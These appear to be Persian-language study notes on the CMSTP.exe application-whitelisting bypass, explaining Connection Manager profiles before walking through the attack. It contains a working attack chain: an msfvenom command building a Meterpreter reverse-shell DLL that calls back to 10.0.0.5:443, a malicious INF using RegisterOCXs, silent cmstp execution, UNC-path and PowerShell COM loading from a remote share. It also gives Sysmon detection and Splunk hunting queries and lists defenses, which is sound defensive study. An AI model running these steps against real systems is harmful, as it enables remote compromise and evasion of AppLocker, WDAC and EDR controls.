


CMSTP.exe 
یک ابزار بومی ویندوز برای نصب پروفایل‌های Connection Manager است.  
پروفایل‌ها شامل مجموعه‌ای از فایل‌های INF, CMP, CMS هستند که تنظیمات اتصال (مثل VPN) را به‌صورت بسته روی سیستم نصب می‌کنند.  
به‌دلیل وجود بخش RunPreSetupCommands در فایل INF، این ابزار امکان اجرای دستورات سیستم را دارد و مهاجمان از آن برای اجرای کد و Bypass سیاست‌های امنیتی سوءاستفاده می‌کنند

- **پروفایل‌های شبکه سازمانی را نصب می‌کند.**
    
- **کل تنظیمات شبکه را روی سیستم کاربر اعمال می‌کند.**
    
- **می‌تواند دستورات اضافی اجرا کند (در INF).**
    
- **می‌تواند فایل‌ها را کپی کند.**
    
- **می‌تواند COM object یا DLL ثبت کند.**
    
- **بدون نیاز به امضای دیجیتال، پروفایل را می‌پذیرد.**
    
- **در سطح کاربر اجرا می‌شود، نه نیاز به Admin، ولی اجازه اجرای اسکریپت دارد.**.


فرض کن یک شرکت ۵۰۰۰ کارمند دارد.  
می‌خواهد همه کارمندان:

- VPN به سرور شرکت بزنند
    
- اتوماسیون شبکه داشته باشند
    
- احراز هویت مشخصی استفاده کنند
    
- مسیرها و پروکسی صحیح تنظیم شود
    
- Dial-up یا DSL تنظیم شود (در دهه ۹۰ / اوایل ۲۰۰۰)
    

به جای توضیح به کارمندان:

### 🟩 «پیکربندی کامل اتصال شبکه کاربران‌شان را به‌صورت یک بسته آماده، نصب کنند.»

یعنی یک شرکت قبلاً می‌خواست:

- تنظیمات VPN
    
- تنظیمات Dial-up
    
- تنظیمات Proxy
    
- سرورها
    
- متدهای احراز هویت
    
- اسکریپت‌های قبل و بعد اتصال
    
- آیکون، نام، مسیر و تنظیمات شبکه کاربر
    

… را خودش برای کارمندها پیکربندی کند.

این کار برای هزاران کاربر زمان‌بر بود.

برای همین **Connection Manager** ساخته شد تا همه این تنظیمات در یک بسته به‌نام **پروفایل** قرار گیرد.


# 🔵 **پروفایل دقیقا چیست؟**

### ⛳ پروفایل = یک بسته تنظیمات (Configuration package)

مایکروسافت این پروفایل را با چند فایل می‌سازد، مهم‌ترین‌هایشان:

## 1) **INF**

یک فایل متنی که شامل:

- تنظیمات اتصال
    
- اسکریپت‌های اتصال
    
- کامندهای قبل و بعد نصب (RunPreSetupCommands)
    
- مسیر فایل‌های مورد نیاز
    
- تعیین اینکه Connection Manager چه کارهایی انجام دهد
    

**این قسمت حساس‌ترین بخش است، چون می‌تواند دستور اجرا کند.**

---

## 2) **CMP**

فایل BINARY که نتیجه کامپایل تنظیمات Connection Manager است.

شامل:

- تنظیمات GUI
    
- مسیر سرور VPN
    
- تنظیمات امنیتی
    
- نوع اتصال
    
- سیاست‌ها
    

این دیگر text نیست — تنظیمات کامپایل‌شده است.

---

## 3) **CMS**

یک فایل متنی دیگر که همراه CMP می‌آید.

شامل:

- تنظیمات مربوط به UI (panelها، متن‌ها، لوگوها)
    
- تنظیمات مربوط به رفتار برنامه
    
- اسکریپت‌های بعد از اتصال

---

حالا ما میتونیم بیایم و از طریق فایل های .inf بیایم و دستورات سیستمی رو اجرا کنیم و مکانیزم های امنیتی از جمله applocker یا WDAC  و موارد این چنینی رو از طریق process های trust بیایم bypass کنیم 

در ابتدا میایم و یک payload از جنس dll میسازیم و بعدش یه اسکریپت .inf میسازیم که بیاد برای ما این dll رو اجرا کنه 

سلام! خیلی عالی، بریم سراغ تکنیک CMSTP از ired.team. این تکنیک یکی از روش‌های هوشمندانه برای اجرای کد دلخواه (Code Execution) و بای‌پس Application Whitelisting هست. بیایم قدم‌به‌قدم بررسیش کنیم، تحلیل کنیم، و ببینیم چطور کار می‌کنه، چطور شناسایی می‌شه، و چطور می‌تونیم دفاع کنیم.

---

تکنیک: CMSTP.exe - Code Execution via .INF Fileهدف:

- اجرای یک DLL مخرب (مثل reverse shell) بدون نیاز به نوشتن روی دیسک (در برخی سناریوها)
- بای‌پس Application Whitelisting چون cmstp.exe یک باینری امضاشده توسط مایکروسافت هست (Living off the Land Binary - LOLBin)
- اجرای payload از طریق Connection Manager Profile Installer

---

مراحل اجرای حمله (از دید مهاجم)1. ساخت payload (DLL reverse shell)

bash

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll
```

خروجی: evil.dll — یک DLL که حاوی Meterpreter reverse shell هست.

---

2. ساخت فایل .inf (فایل تنظیمات Connection Manager)

ini

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection

[RegisterOCXSection]
C:\experiments\cmstp\evil.dll

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```

توضیح بخش‌ها:

- RegisterOCXs=RegisterOCXSection → ترفند اصلی! می‌گه "این DLL رو به عنوان OCX ثبت کن" (که در واقع باعث لود شدنش می‌شه)
- مسیر C:\experiments\cmstp\evil.dll → جایی که DLL قرار داره (می‌تونه UNC path هم باشه!)
- بخش [Strings] فقط برای فریب و شبیه‌سازی یک پروفایل واقعی Connection Manager هست.

---

3. اجرای payload با CMSTP

powershell

```powershell
cmstp.exe /s .\f.inf
```

- /s = silent mode (بدون UI)
- cmstp.exe فایل .inf رو می‌خونه و بخش RegisterOCXs رو اجرا می‌کنه
- این باعث می‌شه راست‌کلیک → Install شبیه‌سازی بشه
- در نتیجه: rundll32.exe فراخوانی می‌شه تا DLL رو لود کنه

---

زنجیره اجرای فرآیندها

```text
cmstp.exe
   └──> rundll32.exe
           └──> evil.dll → Meterpreter → اتصال به LHOST:10.0.0.5:443
```

نکته: rundll32.exe به صورت پیش‌فرض برای لود کردن DLL و فراخوانی DllRegisterServer استفاده می‌شه.

---

تشخیص (Detection) – شکار تهدید1. Sysmon Event ID 1 (Process Creation)جستجو برای:

kql

```text
ParentImage: "*\\cmstp.exe" AND Image: "*\\rundll32.exe"
```

2. Sysmon Event ID 3 (Network Connection)جستجو برای:

kql

```text
Image: "*\\rundll32.exe" AND DestinationPort: 443
```

و فیلتر بر اساس زمان کم بین ایجاد فرآیند و اتصال شبکه (مثلاً < 2 ثانیه)

kql

```text
ProcessCreateTime to NetworkConnectTime < 2s
```

3. Command Line Auditingجستجو برای:

kql

```text
CommandLine: "*cmstp.exe*" AND CommandLine: "*.inf"
```

4. File Creation (اختیاری)اگر .inf روی دیسک نوشته بشه:

kql

```text
FileName: "*.inf" AND FilePath: "*temp*" OR "*users*"
```

---

دفاع (Defense) – چطور جلوش رو بگیریم؟

|روش|توضیح|
|---|---|
|AppLocker / WDAC|بلاک کردن cmstp.exe از اجرای اسکریپت‌ها یا دسترسی به مسیرهای غیرمجاز|
|Restrict LOLBins|محدود کردن cmstp.exe و rundll32.exe در محیط‌های حساس|
|EDR Rules|ایجاد قانون برای بلاک cmstp.exe /s *.inf|
|Network Segmentation|جلوگیری از اتصال خروجی روی پورت‌های غیراستاندارد (مثل 443 از rundll32)|
|Disable CMSTP (if not needed)|با GPO:|
|Computer Configuration → Administrative Templates → Network → Microsoft Connection Manager → Prohibit connection profile installation||

---

نکات پیشرفته

1. UNC Path Injection: می‌تونی DLL رو از مسیر شبکه لود کنی:
    
    ini
    
    ```ini
    \\10.0.0.5\share\evil.dll
    ```
    
    → نیازی به نوشتن روی دیسک نیست!
2. No File on Disk (Fileless): اگر .inf رو در حافظه بسازی و cmstp.exe رو با CMSTP COM object در PowerShell اجرا کنی:
    
    powershell
    
    ```powershell
    $cmstp = [activator]::CreateInstance([type]::GetTypeFromProgID("CMSTP.CMProfile"))
    $cmstp.InstallProfile("\\10.0.0.5\share\f.inf")
    ```
    
3. Bypass AMSI / EDR: چون از LOLBin استفاده می‌شه، بسیاری از EDRها به صورت پیش‌فرض cmstp.exe رو بلاک نمی‌کنن.

---

خلاصه شکار (Hunting Query - Splunk / ELK)

kql

```text
index=winlogs 
(EventCode=1 ParentImage="*\\cmstp.exe" Image="*\\rundll32.exe")
OR (EventCode=3 Image="*\\rundll32.exe" DestinationPort=443)
| eval time_diff = NetworkTime - ProcessCreateTime
| where time_diff < 3
| table _time, ComputerName, User, CommandLine, DestinationIp
```

---

نتیجه‌گیری

|مزیت برای مهاجم|چالش برای مدافع|
|---|---|
|LOLBin امضاشده|نیاز به مانیتورینگ دقیق زنجیره فرآیندها|
|بای‌پس Whitelisting|تشخیص با Sysmon ممکنه|
|اجرای fileless ممکن|نیاز به GPO و محدودیت LOLBin|

---
